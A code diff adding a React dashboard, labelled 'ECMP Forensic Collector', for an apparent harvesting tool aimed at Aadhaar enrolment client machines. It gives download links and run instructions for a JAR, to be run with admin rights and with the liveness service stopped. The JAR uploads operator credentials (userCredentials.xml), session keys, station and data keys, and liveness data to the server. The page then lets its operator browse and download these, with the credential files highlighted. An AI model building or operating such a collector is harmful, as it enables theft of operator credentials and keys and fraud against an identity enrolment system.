@@ -1,0 +1,351 @@
+import { useState, useEffect } from "react";
+import { Layout } from "@/components/layout";
+import { Button } from "@/components/ui/button";
+import { Badge } from "@/components/ui/badge";
+import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
+import { Collapsible, CollapsibleContent, CollapsibleTrigger } from "@/components/ui/collapsible";
+
+const BASE = import.meta.env.BASE_URL.replace(/\/$/, "");
+const API = `${BASE}/api/ecmp-collector`;
+
+interface CollectionMeta {
+  id: string;
+  filename: string;
+  originalName: string;
+  uploadedAt: string;
+  sizeBytes: number;
+  hostname?: string;
+  username?: string;
+  ecmpPath?: string;
+  collectionTimestamp?: string;
+  ipAddress?: string;
+  fileCount?: number;
+}
+
+interface ZipEntry {
+  name: string;
+  isDir: boolean;
+  size: number;
+  compressedSize: number;
+}
+
+export default function EcmpCollector() {
+  const [collections, setCollections] = useState<CollectionMeta[]>([]);
+  const [loading, setLoading] = useState(false);
+  const [browseId, setBrowseId] = useState<string | null>(null);
+  const [entries, setEntries] = useState<ZipEntry[]>([]);
+  const [fileContent, setFileContent] = useState<{ path: string; content: string; type: string } | null>(null);
+  const [browseFilter, setBrowseFilter] = useState("");
+  const [expandedId, setExpandedId] = useState<string | null>(null);
+  const [deleteConfirm, setDeleteConfirm] = useState<string | null>(null);
+
+  useEffect(() => { fetchList(); }, []);
+
+  async function fetchList() {
+    setLoading(true);
+    try {
+      const r = await fetch(`${API}/list`, { cache: "no-store" });
+      const d = await r.json();
+      setCollections(d.collections || []);
+    } catch { }
+    setLoading(false);
+  }
+
+  async function browseZip(id: string) {
+    if (browseId === id) { setBrowseId(null); setEntries([]); setFileContent(null); return; }
+    setBrowseId(id);
+    setFileContent(null);
+    setBrowseFilter("");
+    try {
+      const r = await fetch(`${API}/browse/${id}`);
+      const d = await r.json();
+      setEntries(d.entries || []);
+    } catch { }
+  }
+
+  async function readFile(id: string, entryPath: string) {
+    setFileContent(null);
+    try {
+      const r = await fetch(`${API}/browse/${id}?path=${encodeURIComponent(entryPath)}`);
+      const d = await r.json();
+      setFileContent(d);
+    } catch { }
+  }
+
+  async function deleteCollection(id: string) {
+    try {
+      await fetch(`${API}/collection/${id}`, { method: "DELETE" });
+      setDeleteConfirm(null);
+      if (browseId === id) { setBrowseId(null); setEntries([]); setFileContent(null); }
+      fetchList();
+    } catch { }
+  }
+
+  function formatSize(bytes: number) {
+    if (bytes < 1024) return bytes + " B";
+    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + " KB";
+    return (bytes / 1048576).toFixed(2) + " MB";
+  }
+
+  function formatDate(iso: string) {
+    try { return new Date(iso).toLocaleString("en-IN", { timeZone: "Asia/Kolkata" }); }
+    catch { return iso; }
+  }
+
+  const filteredEntries = entries.filter(e =>
+    !browseFilter || e.name.toLowerCase().includes(browseFilter.toLowerCase())
+  );
+
+  const importantFiles = [
+    "conf/userCredentials.xml",
+    "session/",
+    "station/",
+    "operator/",
+    "lvs/",
+    "data/",
+    "_machine_info.txt",
+  ];
+
+  return (
+    <Layout>
+      <div className="space-y-6">
+        <div className="flex items-center justify-between">
+          <div>
+            <h1 className="text-2xl font-bold text-white flex items-center gap-2">
+              📦 ECMP Forensic Collector
+            </h1>
+            <p className="text-gray-400 mt-1">
+              ECMP machine se conf/data/session/station/lvs/operator folders collect karke server par upload karo
+            </p>
+          </div>
+          <Button onClick={fetchList} disabled={loading} variant="outline" size="sm">
+            {loading ? "Loading..." : "🔄 Refresh"}
+          </Button>
+        </div>
+
+        <Card className="bg-gray-900 border-blue-800">
+          <CardHeader>
+            <CardTitle className="text-blue-400 text-lg">📥 JAR Download + Instructions</CardTitle>
+          </CardHeader>
+          <CardContent className="space-y-4">
+            <div className="flex flex-wrap gap-3">
+              <a href={`${BASE}/downloads/EcmpCollector.jar`} download="EcmpCollector.jar">
+                <Button className="bg-blue-700 hover:bg-blue-600 text-white font-bold px-6">
+                  ⬇️ EcmpCollector.jar v2.2
+                </Button>
+              </a>
+              <a href={`${BASE}/downloads/Run.bat`} download="Run.bat">
+                <Button className="bg-green-700 hover:bg-green-600 text-white font-bold px-6">
+                  ⬇️ Run.bat Download
+                </Button>
+              </a>
+              <a href={`${API}/jar`} download="EcmpCollector.jar">
+                <Button variant="outline" className="border-blue-600 text-blue-400">
+                  ⬇️ Mirror JAR (API)
+                </Button>
+              </a>
+            </div>
+
+            <div className="bg-gray-800 rounded-lg p-4 text-sm space-y-3">
+              <p className="text-yellow-400 font-semibold">📋 ECMP Machine Par Kaise Chalayein:</p>
+              <div className="space-y-2">
+                <p className="text-gray-300">1. <strong className="text-white">EcmpCollector.jar</strong> aur <strong className="text-white">Run.bat</strong> dono download karo</p>
+                <p className="text-gray-300">2. Dono files ko ek folder mein raho (jaise Desktop par)</p>
+                <p className="text-gray-300">3. <strong className="text-green-400">Run.bat</strong> double-click karo — local ECMP JRE auto-use hoga</p>
+                <div className="bg-black rounded p-3 font-mono text-green-400 text-xs">
+                  <p className="text-gray-500"># Ya CMD se manually run karo (ECMP local JRE):</p>
+                  <p>"C:\UID Authority of India\Aadhaar Enrolment Client\jre\bin\java.exe" -jar EcmpCollector.jar</p>
+                </div>
+                <p className="text-orange-400 text-xs">⚠️ LVS folder ke liye Admin rights se run karo (qssitvs service control)</p>
+                <p className="text-gray-300">4. Automatic upload ho jayega — progress screen par dikhega</p>
+                <p className="text-gray-300">5. Yahan page refresh karo — collection neeche dikhegi</p>
+              </div>
+            </div>
+
+            <div className="bg-gray-800 rounded-lg p-4 text-sm">
+              <p className="text-yellow-400 font-semibold mb-2">📂 Kya Collect Hoga (v2.2 — Targeted, JAR auto-detects ECMP path):</p>
+              <div className="space-y-1">
+                {[
+                  ["conf/", "userCredentials.xml, settings files"],
+                  ["data/userCredentials.xml", "Operator credentials (28 KB)"],
+                  ["data/session/", "Session keys (.dat files)"],
+                  ["data/station/", "key.json, registration.json, datakey.json"],
+                  ["data/lvs/", "LVS liveness data (qssitvs service stop/start)"],
+                  ["data/operators/", "Operator sync details"],
+                  ["_machine_info.txt", "Hostname, IP, paths, Java info"],
+                ].map(([folder, desc]) => (
+                  <div key={folder} className="flex gap-2 items-start">
+                    <span className="text-blue-400 font-mono text-xs min-w-fit">{folder}</span>
+                    <span className="text-gray-500 text-xs">— {desc}</span>
+                  </div>
+                ))}
+              </div>
+              <p className="text-green-400 text-xs mt-3">✅ Derby DB aur archive folders skip honge (faster + smaller ZIP)</p>
+            </div>
+          </CardContent>
+        </Card>
+
+        <div className="space-y-4">
+          <h2 className="text-xl font-bold text-white flex items-center gap-2">
+            📋 Uploaded Collections
+            <Badge className="bg-blue-800 text-blue-200">{collections.length}</Badge>
+          </h2>
+
+          {collections.length === 0 && !loading && (
+            <div className="text-center py-12 text-gray-500 border border-dashed border-gray-700 rounded-lg">
+              <p className="text-4xl mb-2">📭</p>
+              <p>Abhi koi collection nahi</p>
+              <p className="text-sm mt-1">JAR chalao aur upload ho jayega</p>
+            </div>
+          )}
+
+          {collections.map(col => (
+            <Card key={col.id} className="bg-gray-900 border-gray-700">
+              <CardHeader className="pb-3">
+                <div className="flex items-start justify-between">
+                  <div className="space-y-1">
+                    <div className="flex items-center gap-2">
+                      <span className="text-white font-semibold font-mono text-sm">{col.originalName}</span>
+                      <Badge className="bg-green-900 text-green-300 text-xs">✅ Uploaded</Badge>
+                    </div>
+                    <div className="flex flex-wrap gap-3 text-xs text-gray-400">
+                      {col.hostname && <span>🖥️ {col.hostname}</span>}
+                      {col.username && <span>👤 {col.username}</span>}
+                      {col.ipAddress && <span>🌐 {col.ipAddress}</span>}
+                      <span>⏰ {formatDate(col.uploadedAt)}</span>
+                      <span>📦 {formatSize(col.sizeBytes)}</span>
+                      {col.fileCount && <span>📄 {col.fileCount} files</span>}
+                    </div>
+                    {col.ecmpPath && (
+                      <p className="text-xs text-blue-400 font-mono">📁 {col.ecmpPath}</p>
+                    )}
+                  </div>
+                  <div className="flex gap-2">
+                    <a href={`${API}/download/${col.id}`} download>
+                      <Button size="sm" variant="outline" className="border-green-700 text-green-400 hover:bg-green-900">
+                        ⬇️ Download
+                      </Button>
+                    </a>
+                    <Button
+                      size="sm"
+                      variant="outline"
+                      className="border-blue-700 text-blue-400 hover:bg-blue-900"
+                      onClick={() => browseZip(col.id)}
+                    >
+                      {browseId === col.id ? "✕ Close" : "🔍 Browse"}
+                    </Button>
+                    {deleteConfirm === col.id ? (
+                      <div className="flex gap-1">
+                        <Button size="sm" variant="destructive" onClick={() => deleteCollection(col.id)}>
+                          Confirm Delete
+                        </Button>
+                        <Button size="sm" variant="outline" onClick={() => setDeleteConfirm(null)}>
+                          Cancel
+                        </Button>
+                      </div>
+                    ) : (
+                      <Button
+                        size="sm"
+                        variant="outline"
+                        className="border-red-800 text-red-400 hover:bg-red-900"
+                        onClick={() => setDeleteConfirm(col.id)}
+                      >
+                        🗑️
+                      </Button>
+                    )}
+                  </div>
+                </div>
+              </CardHeader>
+
+              {browseId === col.id && (
+                <CardContent className="pt-0">
+                  <div className="border-t border-gray-700 pt-4 space-y-3">
+                    <div className="flex gap-2">
+                      <input
+                        className="flex-1 bg-gray-800 border border-gray-700 rounded px-3 py-1 text-sm text-white"
+                        placeholder="Filter files... (e.g. userCredentials, session)"
+                        value={browseFilter}
+                        onChange={e => setBrowseFilter(e.target.value)}
+                      />
+                      <Button size="sm" variant="outline" onClick={() => setBrowseFilter("")}>
+                        Clear
+                      </Button>
+                    </div>
+
+                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
+                      <div className="space-y-1 max-h-96 overflow-y-auto">
+                        <p className="text-xs text-gray-500 mb-2">
+                          {filteredEntries.length} entries
+                          {browseFilter && ` (filtered from ${entries.length})`}
+                        </p>
+
+                        {importantFiles.map(imp => {
+                          const matches = filteredEntries.filter(e =>
+                            e.name.includes(imp.replace("/", "")) && !e.isDir
+                          );
+                          if (matches.length === 0) return null;
+                          return matches.map(e => (
+                            <div
+                              key={e.name}
+                              className="flex items-center justify-between bg-yellow-900/30 border border-yellow-800/50 rounded px-2 py-1 cursor-pointer hover:bg-yellow-900/50"
+                              onClick={() => readFile(col.id, e.name)}
+                            >
+                              <span className="text-yellow-300 text-xs font-mono truncate flex-1">{e.name}</span>
+                              <span className="text-gray-500 text-xs ml-2 shrink-0">{formatSize(e.size)}</span>
+                            </div>
+                          ));
+                        })}
+
+                        {filteredEntries
+                          .filter(e => !importantFiles.some(imp => e.name.includes(imp.replace("/", ""))))
+                          .map(e => (
+                            <div
+                              key={e.name}
+                              className={`flex items-center justify-between rounded px-2 py-1 ${
+                                e.isDir
+                                  ? "bg-gray-800 text-blue-400"
+                                  : "bg-gray-800/50 cursor-pointer hover:bg-gray-700/70 text-gray-300"
+                              }`}
+                              onClick={() => !e.isDir && readFile(col.id, e.name)}
+                            >
+                              <span className="text-xs font-mono truncate flex-1">
+                                {e.isDir ? "📂" : "📄"} {e.name}
+                              </span>
+                              {!e.isDir && (
+                                <span className="text-gray-500 text-xs ml-2 shrink-0">{formatSize(e.size)}</span>
+                              )}
+                            </div>
+                          ))}
+                      </div>
+
+                      {fileContent && (
+                        <div className="space-y-2">
+                          <div className="flex items-center justify-between">
+                            <p className="text-xs text-blue-400 font-mono truncate">{fileContent.path}</p>
+                            <Button
+                              size="sm"
+                              variant="ghost"
+                              className="text-gray-400 text-xs"
+                              onClick={() => setFileContent(null)}
+                            >
+                              ✕
+                            </Button>
+                          </div>
+                          <pre className="bg-black rounded p-3 text-xs text-green-400 overflow-auto max-h-80 font-mono whitespace-pre-wrap break-all">
+                            {fileContent.type === "binary"
+                              ? `[Binary file — ${Math.ceil(fileContent.content.length * 3 / 4)} bytes]\nBase64:\n${fileContent.content.substring(0, 500)}...`
+                              : fileContent.content}
+                          </pre>
+                        </div>
+                      )}
+                    </div>
+                  </div>
+                </CardContent>
+              )}
+            </Card>
+          ))}
+        </div>
+      </div>
+    </Layout>
+  );
+}
